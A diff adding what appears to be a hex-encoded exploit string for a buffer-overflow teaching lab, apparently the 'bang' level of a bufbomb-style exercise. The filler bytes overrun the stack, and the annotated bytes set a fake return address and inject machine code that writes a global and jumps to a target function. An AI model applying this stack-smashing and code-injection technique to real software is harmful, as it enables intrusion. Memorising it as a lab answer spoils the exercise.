@@ -1,0 +1,11 @@
+31 32 33 34 35 36 37 38
+31 32 33 34 35 36 37 38
+31 32 33 34 35 36 37 38
+31 32 33 34 35 36 37 38
+31 32 33 34 35 36 37 38 /* run out the stack space */
+c0 32 68 55 /* dummy old edb value */
+cc 32 68 55 /* code entry: 0x556832c0+0x8+0x01 */
+d1 8c 04 08 /* esp position, content = &bang */
+c7 04 25 64 d2 04 08
+e9 00 c3 42 /* movl $0x42c300e9, 0x804d264 */
+c3	/* ret */
